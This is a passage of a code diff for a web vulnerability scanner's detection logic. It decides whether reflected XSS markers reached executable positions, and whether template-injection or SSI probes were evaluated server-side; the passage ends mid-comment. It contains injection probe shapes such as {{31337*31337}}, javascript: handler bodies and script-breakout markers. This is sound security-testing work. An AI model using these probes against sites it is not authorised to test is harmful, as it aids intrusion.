+    value. Pure and deterministic. Every branch below is measured against
+    /usr/bin/chromium 150 in ``test_script_type_executability_matches_chromium``:
+
+      * attribute ABSENT              -> classic, EXECUTES
+      * ``type=""`` (raw empty)       -> classic, EXECUTES  (LS: "if the type
+        attribute's value is the empty string, the script block's type is classic")
+      * ``type=" "`` / ``type="\\t"``  -> does NOT execute. The empty-string rule is
+        about the RAW value; a whitespace-only value strips to ``""``, which is not
+        a JavaScript MIME essence and is not ``module``, so the element is a data
+        block. (Chromium: measured inert. The old code stripped first and let it in
+        through the ``""`` member.)
+      * stripped, case-folded value in :data:`_JS_MIME_ESSENCES` -> EXECUTES
+      * raw value case-insensitively equal to ``module`` -> EXECUTES.  The match is
+        on the UNSTRIPPED value: Chromium runs ``type="MODULE"`` and does NOT run
+        ``type=" module "``.  Where Chromium and the LS may differ (the LS strips),
+        this oracle takes the NON-FIRING option — a missed detection, never a
+        manufactured FACT.
+      * ``nomodule`` present on a CLASSIC script -> does NOT execute ("prepare the
+        script element" step 13 returns early). Measured: ``<script nomodule>``
+        inert, ``<script type="module" nomodule>`` EXECUTES (``nomodule`` is
+        ignored for module scripts), ``nomodule="false"`` inert (boolean attribute
+        — presence is the test)."""
+    if type_attr is None:
+        is_module, executable = False, True
+    elif type_attr == "":
+        is_module, executable = False, True
+    else:
+        lowered = type_attr.lower()
+        is_module = lowered == "module"
+        executable = is_module or type_attr.strip().lower() in _JS_MIME_ESSENCES
+    if not executable:
+        return False, "script_data_block"
+    if has_nomodule and not is_module:
+        return False, "script_nomodule_ignored"
+    return True, ""
+
+
+_EVENT_HANDLER_ATTRIBUTES = frozenset({
+    # AUDIT-B4 (measured in Chromium 150): real handler content attributes this
+    # closed set was missing.
+    "oncommand", "oncontentvisibilityautostatechange", "onmousewheel",
+    "onscrollsnapchange", "onscrollsnapchanging",
+    # HTML LS: element / document / window event handlers
+    "onabort", "onauxclick", "onbeforeinput", "onbeforematch", "onbeforetoggle",
+    "onblur", "oncancel", "oncanplay", "oncanplaythrough", "onchange", "onclick",
+    "onclose", "oncontextlost", "oncontextmenu", "oncontextrestored", "oncopy",
+    "oncuechange", "oncut", "ondblclick", "ondrag", "ondragend", "ondragenter",
+    "ondragexit", "ondragleave", "ondragover", "ondragstart", "ondrop",
+    "ondurationchange", "onemptied", "onended", "onerror", "onfocus", "onformdata",
+    "oninput", "oninvalid", "onkeydown", "onkeypress", "onkeyup", "onload",
+    "onloadeddata", "onloadedmetadata", "onloadstart", "onmousedown", "onmouseenter",
+    "onmouseleave", "onmousemove", "onmouseout", "onmouseover", "onmouseup",
+    "onpaste", "onpause", "onplay", "onplaying", "onprogress", "onratechange",
+    "onreset", "onresize", "onscroll", "onscrollend", "onsecuritypolicyviolation",
+    "onseeked", "onseeking", "onselect", "onslotchange", "onstalled", "onsubmit",
+    "onsuspend", "ontimeupdate", "ontoggle", "onvolumechange", "onwaiting", "onwheel",
+    # HTML LS: Window-reflecting handlers (<body> / <frameset>)
+    "onafterprint", "onbeforeprint", "onbeforeunload", "onhashchange",
+    "onlanguagechange", "onmessage", "onmessageerror", "onoffline", "ononline",
+    "onpagehide", "onpagereveal", "onpageshow", "onpageswap", "onpopstate",
+    "onrejectionhandled", "onstorage", "onunhandledrejection", "onunload",
+    # CSS animations / transitions
+    "onanimationcancel", "onanimationend", "onanimationiteration", "onanimationstart",
+    "ontransitioncancel", "ontransitionend", "ontransitionrun", "ontransitionstart",
+    "onwebkitanimationend", "onwebkitanimationiteration", "onwebkitanimationstart",
+    "onwebkittransitionend",
+    # Pointer / touch / gesture
+    "ongotpointercapture", "onlostpointercapture", "onpointercancel", "onpointerdown",
+    "onpointerenter", "onpointerleave", "onpointermove", "onpointerout",
+    "onpointerover", "onpointerrawupdate", "onpointerup", "ontouchcancel",
+    "ontouchend", "ontouchmove", "ontouchstart",
+    # Misc. widely-implemented content attributes
+    "onbeforecopy", "onbeforecut", "onbeforepaste", "onfocusin", "onfocusout",
+    "onfullscreenchange", "onfullscreenerror", "oninputsourceschange", "onsearch",
+    "onselectionchange", "onselectstart", "onshow", "onwebkitfullscreenchange",
+    "onwebkitfullscreenerror",  # ("ontoggle" listed once, with the HTML LS block above)
+})
+
+
+_ON_SHAPED_ATTRIBUTE = re.compile(r"on[a-z]+\Z")
+
+
+def _rindex(seq: list[str], value: str) -> int:
+    """Index of the LAST occurrence of ``value`` in ``seq``. Pure; the caller has
+    already checked membership."""
+    return len(seq) - 1 - seq[::-1].index(value)
+
+
+def _js_scan(script_text: str, idx: int) -> tuple[bool, str]:
+    """Walk ``script_text`` up to ``idx`` and report
+    ``(at_code_position, ambiguity)``.
+
+    ``at_code_position`` is True iff offset ``idx`` is NOT inside a string literal,
+    template literal or comment. It is meaningful ONLY when ``ambiguity`` is the
+    empty string.
+
+    ``ambiguity`` names the first construct this deliberately-small, pure,
+    stdlib-only lexer does NOT model. The caller MUST fail closed on it.
+
+    RED-PEN B1 (the reason this function exists in this shape). The previous
+    version claimed "every misparse biases toward NOT-code → NOT-firing. The
+    failure direction is a missed detection, never a manufactured FACT". That was
+    FALSE, and reproduced in five shapes. The lexer had no regex-literal state, so
+    ``/it's/`` opened a PHANTOM single-quote state, and the OPENING quote of the
+    NEXT real string CLOSED it — leaving the real string's CONTENTS at apparent
+    code position. One quote of desync manufactures a High ``xss`` FACT at 0.90 on
+    a CORRECTLY ESCAPED page. The same one-quote desync is reachable through
+    Annex B ``<!--`` / ``-->`` (SingleLineHTMLOpenComment / HTMLCloseComment, which
+    a browser lexes as line comments inside a classic script) and through a
+    template-literal substitution ``${…}`` whose body contains a quote or a nested
+    backtick.
+
+    So the lexer no longer guesses. Each unmodelled construct encountered BEFORE
+    the marker offset aborts the walk with an ``ambiguity`` name:
+
+      ``regex_literal``          a ``/`` at apparent code position that is not
+                                 ``//`` or ``/*`` — a regex literal or a division,
+                                 and this lexer cannot tell which;
+      ``html_comment``           ``<!--`` or ``-->`` anywhere before the marker;
+      ``template_substitution``  a ``${`` inside a template literal;
+      ``hashbang``               a ``#!`` at apparent code position that is NOT at
+                                 offset 0 (see below).
+
+    AUDIT-B3 — the HashbangComment. ``#!`` at offset 0 of a script's source text is
+    a comment running to the end of the first line (ECMA-262 § Hashbang Comments;
+    ``node -e`` and Chromium agree). The lexer had no state for it, found no
+    ambiguity, and reported the first line as CODE POSITION — measured firing at
+    0.90 on ``<script>#! …</script>`` that Chromium does not execute at all. That is
+    the same class B1's fail-closed design exists to eliminate, so it is modelled
+    here rather than merely refused:
+
+      * at offset 0 the walk skips to the first line terminator — EXACT, so a
+        marker on the hashbang line is correctly "not code" and a marker after it
+        is still adjudicated normally (no capability lost);
+      * anywhere else ``#!`` at code position is a SyntaxError, so the whole script
+        fails to parse and NOTHING executes — the lexer refuses rather than
+        silently call the surrounding text code.
+
+    A ``#!`` inside a string literal (``var r = "#!/users"`` — the legacy hashbang
+    routing shape) is in string state and is not reached by either rule, so this
+    costs no real detection; measured.
+
+    A missed detection is an INCONCLUSIVE advisory and recoverable. A manufactured
+    FACT is not. Pure and deterministic."""
+    n = len(script_text)
+    stop = min(idx, n)
+    head = script_text[:stop]
+    # Annex B HTML-like comments are lexed by a real JS engine as line comments;
+    # this lexer does not model them at all, so their mere PRESENCE before the
+    # marker is ambiguity. Checked as a substring (not gated on lexer state)
+    # because the HTML tokenizer's script-data-escaped states react to ``<!--``
+    # irrespective of JS string context.
+    if "<!--" in head or "-->" in head:
+        return False, "html_comment"
+
+    state: str | None = None   # None | "'" | '"' | "`" | "//" | "/*"
+    i = 0
+    # AUDIT-B3: a HashbangComment is legal ONLY at offset 0 and runs to the first
+    # line terminator. Modelled exactly. (Only \n and \r are treated as
+    # terminators, matching the "//" state below: recognising fewer terminators
+    # extends the comment, which is the NON-FIRING direction.)
+    if script_text.startswith("#!"):
+        j = 2
+        while j < n and script_text[j] not in ("\n", "\r"):
+            j += 1
+        if stop <= j:
+            return False, ""       # the marker sits INSIDE the hashbang comment
+        i = j
+    while i < stop:
+        c = script_text[i]
+        if state is None:
+            if c in ("'", '"', "`"):
+                state = c
+            elif c == "#" and i + 1 < n and script_text[i + 1] == "!":
+                # AUDIT-B3: `#!` away from offset 0 is a SyntaxError — the script
+                # never runs, so "code position" is not a claim this lexer may
+                # make. FAIL CLOSED. (`#x` private names are untouched.)
+                return False, "hashbang"
+            elif c == "/":
+                nxt = script_text[i + 1] if i + 1 < n else ""
+                if nxt == "/":
+                    state = "//"
+                    i += 1
+                elif nxt == "*":
+                    state = "/*"
+                    i += 1
+                else:
+                    # A regex literal or a division — indistinguishable without a
+                    # full token stream. FAIL CLOSED.
+                    return False, "regex_literal"
+        elif state in ("'", '"'):
+            if c == "\\":
+                i += 1
+            elif c == state:
+                state = None
+        elif state == "`":
+            if c == "\\":
+                i += 1
+            elif c == "$" and i + 1 < n and script_text[i + 1] == "{":
+                # A substitution's body is CODE (it may contain strings, nested
+                # template literals and regexes). Not modelled → FAIL CLOSED.
+                return False, "template_substitution"
+            elif c == "`":
+                state = None
+        elif state == "//":
+            if c in ("\n", "\r"):
+                state = None
+        elif state == "/*":
+            if c == "*" and i + 1 < n and script_text[i + 1] == "/":
+                state = None
+                i += 1
+        i += 1
+    return state is None, ""
+
+
+class _ReflectionScanner(HTMLParser):
+    """Locate a marker's parse context with stdlib HTML parsing, and decide whether
+    the payload PROVABLY BROKE OUT into that position (see the module note above).
+
+    ``context`` is set only for a proven breakout (``html_tag`` / ``js_attribute:…``
+    / ``script``). ``advisory`` records the strongest NON-proving observation — the
+    marker was seen in/near an executable position but as escaped DATA the page put
+    there, which is not a breakout."""
+
+    def __init__(self, marker_lower: str) -> None:
+        super().__init__(convert_charrefs=True)
+        self._ml = marker_lower
+        self._in_script = False
+        self._script_executable = False
+        # RED-PEN B2: per the HTML spec a <script> that bears a `src` IGNORES its
+        # child text entirely — the element's inline content never runs. The old
+        # `_script_executable` looked only at `type`, so
+        # `<script src="/app.js">MARKER();</script>` fired at 0.90 on text no
+        # browser evaluates.
+        self._script_has_src = False
+        # AUDIT-B2: `nomodule` makes a CLASSIC script non-executing.
+        self._script_nonexec_reason = ""
+        # RED-PEN B1: the JS lexer starts from a known state only at the FIRST data
+        # chunk of a script element. If HTMLParser ever splits a script's text, a
+        # later chunk begins mid-token and "code position" is unknowable — so a
+        # continuation chunk is ambiguity, never a breakout.
+        self._script_chunk = 0
+        self._inert_depth = 0
+        # AUDIT-B1: the innermost open inert container, so the advisory can NAME it.
+        self._inert_tags: list[str] = []
+        self.context: str | None = None
+        self.detail: str = ""
+        self.advisory: str | None = None
+        self.advisory_detail: str = ""
+
+    # -- advisory bookkeeping ------------------------------------------------
+
+    def _note(self, kind: str, detail: str = "") -> None:
+        if self.advisory is None:
+            self.advisory, self.advisory_detail = kind, detail
+
+    # -- parser callbacks ----------------------------------------------------
+
+    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        t = tag.lower()
+        if t == "script":
+            # AUDIT-B2: keep the RAW `type` value — the LS distinguishes the raw
+            # empty string (classic) from a whitespace-only one (a data block), and
+            # the essence match forbids parameters. No `.split(";")`, no pattern.
+            raw_type: str | None = None
+            has_src = False
+            has_nomodule = False
+            # HTML DUPLICATE-ATTRIBUTE FIRST-WINS: the tokenizer keeps the FIRST occurrence of an attribute
+            # name and DISCARDS every later one, so `<script type="application/json" type="text/javascript">`
+            # is a DATA block to Chromium — the FIRST `type` (a JSON essence) wins, not the executable one.
+            # Take the first `type` only (`raw_type is None` == "not yet seen"). `has_src` / `has_nomodule`
+            # are presence flags, so which duplicate wins does not change them.
+            for name, val in attrs:
+                lname = name.lower()
+                if lname == "type" and raw_type is None:
+                    raw_type = val if val is not None else ""
+                elif lname == "src":
+                    has_src = True
+                elif lname == "nomodule":
+                    has_nomodule = True
+            self._in_script = True
+            executable, reason = _script_is_executable(raw_type, has_nomodule)
+            self._script_executable = executable
+            self._script_nonexec_reason = reason
+            self._script_has_src = has_src
+            self._script_chunk = 0
+        if t in _INERT_TEXT_CONTAINERS:
+            self._inert_depth += 1
+            self._inert_tags.append(t)
+        if self.context is not None:
+            return
+
+        inert = self._inert_depth > 0
+        if self._ml in t:
+            if inert:
+                self._note("inert_text_container", t)
+            else:
+                self.context, self.detail = "html_tag", tag
+            return
+        # HTML DUPLICATE-ATTRIBUTE FIRST-WINS (the same tokenizer rule as the <script> `type` above): once an
+        # attribute NAME has been seen on this tag the tokenizer discards every later occurrence, so it never
+        # reaches Chromium. `<div onclick="void 0" onclick="MARKER">` runs `void 0` (the FIRST onclick) and
+        # `<a href="#" href="javascript:MARKER">` navigates `#` (the FIRST href) — the marker in the SECOND
+        # occurrence is inert. The name is recorded on first sight, BEFORE the marker filter, so a duplicate
+        # is dropped even when the first occurrence carried no marker; refusing it kills FACTs Chromium would
+        # never execute.
+        seen_attr_names: set[str] = set()
+        for name, val in attrs:
+            a = name.lower()
+            if a in seen_attr_names:
+                continue
+            seen_attr_names.add(a)
+            v = val or ""
+            if self._ml not in v.lower():
+                continue
+            stripped = v.strip()
+            # RED-PEN B2: membership of the CLOSED event-handler set, never an
+            # `on` prefix (`on-click` / `once` / `online` are not handlers).
+            is_handler = a in _EVENT_HANDLER_ATTRIBUTES
+            is_js_url = (a in ("href", "src", "action", "formaction")
+                         and stripped.lower().startswith("javascript:"))
+            if not (is_handler or is_js_url):
+                # AUDIT-B4 — a CLOSED-SET MISS MUST NOT FALL THROUGH TO "CLEAN".
+                # The comment on `_EVENT_HANDLER_ATTRIBUTES` promises a miss is "a
+                # non-firing advisory — recoverable". Without this branch it was
+                # not: nothing called `_note`, so the scan reached the terminal
+                # `conclusive=True` return and `probe_verdict` certified the probe
+                # CLEAN. Measured on `oncontentvisibilityautostatechange`, a real
+                # Chromium-executed handler: a true positive became a
+                # channel-confirmed clean. Any `on`-SHAPED non-member is therefore
+                # an advisory. It still cannot FIRE — firing needs membership.
+                if _ON_SHAPED_ATTRIBUTE.match(a):
+                    if inert:
+                        self._note("inert_text_container", name)
+                    else:
+                        self._note("unmodelled_handler_shape", name)
+                continue
+            if inert:
+                self._note("inert_text_container", name)
+                continue
+            # SOUND BREAKOUT (R5): the attacker must own the WHOLE executable value.
+            # A marker embedded inside a larger expression the PAGE composed
+            # (``onclick="search(&quot;…marker…&quot;)"``) is the page's own handler
+            # with the value correctly escaped into it — it did not break out.
+            body = stripped
+            if is_js_url:
+                body = stripped[len("javascript:"):].strip()
+            if body.lower() == self._ml:
+                self.context, self.detail = f"js_attribute:{name}", name
+                return
+            self._note("js_attribute_data", name)
+
+    def _close(self, t: str) -> None:
+        if t == "script":
+            self._in_script = False
+            self._script_executable = False
+            self._script_nonexec_reason = ""
+            self._script_has_src = False
+            self._script_chunk = 0
+        if t in _INERT_TEXT_CONTAINERS and t in self._inert_tags:
+            # AUDIT-B1: close back to the MATCHING open container. An UNMATCHED end
+            # tag must be IGNORED, exactly as a browser ignores one — a plain
+            # `self._inert_depth -= 1` let the shipped `</title><script>{marker}`
+            # payload cancel an enclosing `<noscript>` that was never closed, and
+            # the marker was reported live again. Chromium, measured: it is not.
+            del self._inert_tags[_rindex(self._inert_tags, t):]
+            self._inert_depth = len(self._inert_tags)
+
+    def handle_startendtag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
+        self.handle_starttag(tag, attrs)
+        # a self-closing form opens nothing, so undo the container/script bookkeeping
+        self._close(tag.lower())
+
+    def handle_endtag(self, tag: str) -> None:
+        self._close(tag.lower())
+
+    def handle_data(self, data: str) -> None:
+        if not self._in_script:
+            return
+        chunk = self._script_chunk
+        self._script_chunk += 1
+        if self.context is not None:
+            return
+        low = data.lower()
+        idx = low.find(self._ml)
+        if idx < 0:
+            return
+        if self._inert_depth > 0:
+            # AUDIT-B1 — `_inert_depth` was maintained but READ ONLY in
+            # `handle_starttag`. Python's HTMLParser has RCDATA handling for
+            # textarea/title/iframe/xmp, so those were ACCIDENTALLY safe — but NOT
+            # for <noscript> (with scripting enabled the HTML LS gives its start tag
+            # the generic RAW TEXT algorithm) or <template> (whose contents live in
+            # an inert DocumentFragment). So a nested <script> inside either was
+            # reported live. Measured: `<noscript><script>M</script></noscript>` and
+            # the <template> twin both fired 0.90 ctx=script; Chromium executes
+            # NEITHER, and six SHIPPED m2 payloads minted a High/0.9 xss FACT
+            # end-to-end through `confirm_finding`.
+            self._note("inert_text_container",
+                       self._inert_tags[-1] if self._inert_tags else "script")
+            return
+        if not self._script_executable:
+            # <script type="application/json"> and friends: a DATA block the browser
+            # never executes. Django's json_script emits exactly this. AUDIT-B2 adds
+            # the `nomodule` classic script and the whitespace-only `type`.
+            self._note(self._script_nonexec_reason or "script_data_block")
+            return
+        if self._script_has_src:
+            # RED-PEN B2: a `src`-bearing <script> never evaluates its child text.
+            self._note("script_src_ignored_body")
+            return
+        if chunk:
+            # RED-PEN B1: a continuation chunk starts mid-token — fail closed.
+            self._note("script_lexer_ambiguous", "split_script_text")
+            return
+        code, ambiguity = _js_scan(data, idx)
+        if ambiguity:
+            # RED-PEN B1 — FAIL CLOSED ON LEXER AMBIGUITY. A regex literal, an
+            # Annex B `<!--`/`-->` comment or a template substitution before the
+            # marker desyncs this lexer by one quote, which is enough to report a
+            # STRING's contents as code. Downgrade to a non-firing, non-conclusive
+            # advisory rather than mint a FACT the page does not support.
+            self._note("script_lexer_ambiguous", ambiguity)
+            return
+        if code:
+            self.context, self.detail = "script", "script"
+        else:
+            # F4: inside a string literal / template literal / comment — the value
+            # cannot terminate the element or the literal, so no breakout is proven.
+            self._note("script_string_literal")
+
+
+def reflection_context_oracle(marker: str, observed_sink: Any) -> OracleSignal:
+    """Fire only when the reflected marker PROVABLY BROKE OUT into a live,
+    executable position — never merely because the marker substring is present
+    somewhere executable-looking.
+
+    Substring-presence (what ``side_effect_oracle`` and most DAST use for XSS)
+    over-reports: a marker reflected inside an HTML-encoded attribute, a comment,
+    or plain text is inert. So does "the marker is somewhere inside a ``<script>``"
+    or "somewhere inside an ``on*`` value" — the audited F4/R5 false positives,
+    which a CORRECTLY escaped page (Django ``json_script``, a ``&quot;``-escaped
+    handler) reproduces on demand. The response is PARSED (stdlib, no third-party
+    dependency) and a signal fires ONLY for a proven breakout:
+
+      * ``html_tag``     — the marker is (part of) a TAG NAME: the payload created
+        an element (0.95);
+      * ``js_attribute`` — the marker is the ENTIRE value of an event-handler
+        attribute, or the entire body of a ``javascript:`` URL: the attacker owns
+        the whole handler (0.90);
+      * ``script``       — the marker sits at CODE position (outside every string
+        literal, template literal and comment) inside a script the browser actually
+        EXECUTES (``type`` absent or a JS MIME) (0.90).
+
+    Anything weaker — a marker inside a JS string literal, inside a handler
+    expression the page composed, inside a ``type="application/json"`` data block,
+    or inside a raw-text container (``<noscript>``/``<textarea>``/…) — is returned
+    as a NON-FIRING, NON-CONCLUSIVE advisory: not a FACT, and not a clean bill of
+    health either. A fully encoded / text-only reflection is the one decisive
+    negative (``conclusive=True``).
+
+    SCOPE: this oracle proves a reflection reached a LIVE / EXECUTABLE POSITION.
+    It does NOT prove EXECUTION — that is the DOM_EXECUTION oracle's claim, and no
+    evidence string here may be read as one."""
+    marker = (marker or "").strip()
+    body = observed_sink if isinstance(observed_sink, str) else _searchable(observed_sink)
+    if len(marker) < 4:
+        return OracleSignal(
+            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
+            evidence="marker too short to be a reliable canary", observed={"marker": marker})
+    ml = marker.lower()
+    if ml not in body.lower():
+        return OracleSignal(
+            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
+            evidence=f"marker {marker!r} not reflected", observed={"marker": marker})
+
+    scanner = _ReflectionScanner(ml)
+    try:
+        scanner.feed(body)
+        scanner.close()
+    except Exception:
+        scanner.context = None
+
+    if scanner.context == "html_tag":
+        return OracleSignal(
+            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.95,
+            evidence=(f"marker became the TAG NAME of a live element <{scanner.detail}> — the payload "
+                      f"broke out into markup (injection into an executable position PROVEN; this "
+                      f"oracle does not prove execution)"),
+            observed={"marker": marker, "context": "html_tag", "tag": scanner.detail})
+    if scanner.context == "script":
+        return OracleSignal(
+            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
+            evidence=("marker sits at CODE position inside an executable <script> — outside every string "
+                      "literal, template literal and comment, so the payload broke out of the data "
+                      "position (injection into an executable position PROVEN; this oracle does not "
+                      "prove execution)"),
+            observed={"marker": marker, "context": "script"})
+    if scanner.context and scanner.context.startswith("js_attribute"):
+        return OracleSignal(
+            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
+            evidence=(f"marker is the ENTIRE value of executable attribute {scanner.detail!r} — the "
+                      f"attacker supplied the whole handler / javascript: URL body (injection into an "
+                      f"executable position PROVEN; this oracle does not prove execution)"),
+            observed={"marker": marker, "context": scanner.context})
+
+    if scanner.advisory is not None:
+        # AUDIT F4/R5 — NON-FIRING ADVISORY. The marker was seen in or beside an
+        # executable position, but as DATA the page itself placed there; no breakout
+        # is proven. NOT conclusive either: an escaping bug this parse cannot see
+        # could still make it executable, so the honest verdict is "UNRESOLVED —
+        # needs an execution-proving oracle, run by an operator" (no automatic
+        # handoff exists; see the module note), never "clean" and never a FACT.
+        _ADVISORY_EVIDENCE = {
+            "script_string_literal":
+                "marker is inside a JS STRING LITERAL / template literal / comment in an executable "
+                "<script> — it cannot terminate the literal or the element from this parse, so NO "
+                "breakout is proven (the Django json_script / Rails json_escape shape). ADVISORY ONLY",
+            "script_data_block":
+                "marker is inside a <script> the browser does NOT execute (type is a data MIME such as "
+                "application/json) — NO breakout is proven. ADVISORY ONLY",
+            "js_attribute_data":
+                f"marker is EMBEDDED IN a larger expression in attribute {scanner.advisory_detail!r} that "
+                "the PAGE composed (e.g. a correctly &quot;-escaped handler argument) — the attacker does "
+                "not own the value, so NO breakout is proven. ADVISORY ONLY",
+            "inert_text_container":
+                f"marker reached {scanner.advisory_detail!r} inside a raw-text container "
+                "(<noscript>/<textarea>/<title>/<template>/…) whose content a browser does not parse as "
+                "live markup — NO breakout is proven. ADVISORY ONLY",
+            "script_src_ignored_body":
+                "marker is inside a <script> that bears a `src` attribute — per the HTML spec such an "
+                "element IGNORES its child text, so the reflected bytes are never evaluated and NO "
+                "breakout is proven. ADVISORY ONLY",
+            "script_nomodule_ignored":
+                "marker is inside a CLASSIC <script> bearing `nomodule` — 'prepare the script element' "
+                "returns early for it, so a module-supporting browser never evaluates the element and NO "
+                "breakout is proven (measured inert in Chromium 150). ADVISORY ONLY",
+            "unmodelled_handler_shape":
+                f"marker is in attribute {scanner.advisory_detail!r}, which has the SHAPE of an HTML "
+                "event-handler content attribute but is NOT in this oracle's closed, measured set of "
+                "handlers — so whether a browser would execute it is UNKNOWN to this oracle. It does not "
+                "fire (firing needs membership) and it is explicitly NOT a clean bill of health. "
+                "ADVISORY ONLY",
+            "script_lexer_ambiguous":
+                f"marker is inside an executable <script> whose text contains "
+                f"{scanner.advisory_detail!r} before the marker — a construct this lexer does not model "
+                "(regex literal vs division, an Annex B <!-- / --> comment, a template substitution, a "
+                "misplaced hashbang, or split script text). The code-vs-string verdict is therefore "
+                "UNKNOWN, and this oracle FAILS CLOSED rather than risk reporting a string literal as "
+                "code. ADVISORY ONLY — this verdict is UNRESOLVED, not clean. NOTE: nothing in this "
+                "engine schedules a follow-up probe on this advisory; resolving it requires an operator "
+                "to run an execution-proving oracle by hand (wiring that handoff is tracked, not shipped)",
+        }
+        return OracleSignal(
+            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
+            conclusive=False,
+            evidence=_ADVISORY_EVIDENCE.get(
+                scanner.advisory, "marker in a non-proving position. ADVISORY ONLY"),
+            observed={"marker": marker, "context": scanner.advisory,
+                      "detail": scanner.advisory_detail, "advisory": True})
+
+    return OracleSignal(
+        kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
+        # CHANNEL-CONFIRMED NEGATIVE: the marker WAS reflected (`ml in body` above),
+        # so the payload provably reached the response sink — and it landed only in an
+        # inert/encoded position. That is a decisive "reflected-but-neutralised" clean,
+        # unlike the "not reflected" branch above (no channel → non-conclusive/inconclusive).
+        conclusive=True,
+        evidence="marker reflected but NOT in an executable context (encoded/inert)",
+        observed={"marker": marker, "context": "inert"})
+
+
+def evaluation_oracle(
+    raw_expr: str,
+    expected_result: str,
+    observed_body: Any,
+    control_body: Any = None,
+) -> OracleSignal:
+    """Fire when an injected expression was **evaluated** by the server, not
+    merely reflected — the signature of server-side template / expression-language
+    injection (Jinja2/Twig/Freemarker/Velocity/ERB/Smarty/Mako/Thymeleaf, EL).
+
+    The proof is deliberately strict, because "reflected" and "evaluated" look
+    identical unless you separate them:
+
+      1. the ``expected_result`` (what ``raw_expr`` computes to, e.g. ``31337*31337
+         -> 981538969``) appears in the response, AND
+      2. the ``raw_expr`` itself (``{{31337*31337}}``) does NOT appear — if the
+         raw template text survives, the input was reflected verbatim, not
+         evaluated, so this is NOT SSTI, AND
+      3. when a benign ``control_body`` is supplied, the ``expected_result`` does
+         NOT occur in it — so a value that merely happens to be on the page can
+         never be mistaken for an evaluation.
+
+    Use a distinctive arithmetic result (a large product, not ``7*7=49``) so the
+    expected value cannot coincidentally appear. A reflected-but-unevaluated
+    payload, an encoded payload, or a benign page all correctly do NOT fire."""
+    raw = (raw_expr or "").strip()
+    expected = (expected_result or "").strip()
+    body = _coerce_text(observed_body)
+
+    if len(expected) < 2:
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
+            evidence="expected evaluation result too short to be a reliable marker",
+            observed={"expected": expected})
+
+    if expected not in body:
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
+            evidence=f"evaluated result {expected!r} not present; expression was not evaluated",
+            observed={"expected": expected, "raw_present": raw in body})
+
+    if raw and raw in body:
+        # The literal template text survived — reflection, not evaluation.
+        # CHANNEL-CONFIRMED NEGATIVE: the raw expression provably reached the response
+        # sink and was rendered as inert text (not computed), so this is a decisive
+        # "reached-but-not-evaluated" clean — distinct from the "result absent" branch
+        # above (a blind/second-order sink where nothing was observed → inconclusive).
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0, conclusive=True,
+            evidence=f"raw expression {raw!r} reflected verbatim — reflected, not evaluated",
+            observed={"expected": expected, "raw_present": True})
+
+    if control_body is not None and expected in _coerce_text(control_body):
+        # The "result" is just part of the page regardless of the payload.
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
+            evidence=f"result {expected!r} also present in the benign control — not attributable to evaluation",
+            observed={"expected": expected})
+
+    idx = body.find(expected)
+    snippet = body[max(0, idx - 24): idx + len(expected) + 24]
+    return OracleSignal(
+        kind=OracleKind.EVALUATION,
+        fired=True,
+        confidence=0.95,
+        evidence=f"expression {raw!r} evaluated to {expected!r} server-side: ...{snippet}...",
+        observed={"expected": expected, "raw": raw, "snippet": snippet},
+    )
+
+
+_SSI_DIRECTIVE_RE = re.compile(r"<!--#\s*[A-Za-z]+\b[^>]*-->", re.DOTALL)
+
+
+def ssi_evaluation_oracle(
+    raw_directive: str,
+    expected_result: str,
+    observed_body: Any,
+    control_body: Any = None,
+) -> OracleSignal:
+    """Fire when an injected **Server-Side Include (SSI) directive was EVALUATED** by the
+    server — the arithmetic it carries was COMPUTED and its product emitted — not merely
+    reflected (CWE-97: Improper Neutralization of Server-Side Includes).
+
+    The same strict computed-product proof the SSTI/EL :func:`evaluation_oracle` uses,
+    specialised to SSI so it can never be confused with a template-expression evaluation and so
+    a page that merely echoes the directive as an inert HTML comment never fires:
+
+      1. ``raw_directive`` must be a well-formed SSI directive (``<!--#…-->``) — a payload that is
+         not an SSI directive is not an SSI probe and never fires here (keeps the class distinct);
+      2. the ``expected_result`` — the PER-PROBE product ``N1*N2``, unguessable and unable to
+         pre-exist — appears in the response, AND
+      3. the raw directive does NOT survive verbatim: if ``<!--#…-->`` is echoed back unchanged the
+         include was NOT processed (SSI disabled / reflected as an inert comment), which is the
+         honest boundary — reflected, not evaluated — and a CHANNEL-CONFIRMED clean, AND
+      4. when a benign ``control_body`` is supplied, the product does NOT occur in it — so a value
+         that merely happens to be on the page can never be mistaken for an evaluation.
+
+    Use a distinctive per-probe random product (a large ``N1*N2``, never ``7*7``) so the expected
+    value cannot coincidentally appear. A reflected-but-unevaluated directive, an escaped payload,
+    or a benign page all correctly do NOT fire."""
+    raw = (raw_directive or "").strip()
+    expected = (expected_result or "").strip()
+    body = _coerce_text(observed_body)
+
+    if len(expected) < 2:
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
+            evidence="expected SSI evaluation result too short to be a reliable marker",
+            observed={"expected": expected})
+
+    if not _SSI_DIRECTIVE_RE.search(raw):
+        # Not a genuine SSI directive — nothing SSI-specific to adjudicate. NON-conclusive: the
+        # probe never carried an include directive, so this says nothing about the target.
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
+            evidence=f"payload {raw!r} is not a well-formed SSI directive (<!--#…-->) — not an SSI probe",
+            observed={"raw": raw})
+
+    if expected not in body:
+        return OracleSignal(
+            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
+            evidence=f"computed product {expected!r} not present; the SSI directive was not evaluated",
+            observed={"expected": expected, "raw_present": raw in body})
+
+    if raw and raw in body:
+        # The literal SSI directive survived verbatim — SSI is disabled and the directive was echoed
+        # as an inert HTML comment. CHANNEL-CONFIRMED NEGATIVE: the directive provably reached the
+        # response sink and was NOT processed (reflected, not evaluated) — the honest boundary, a
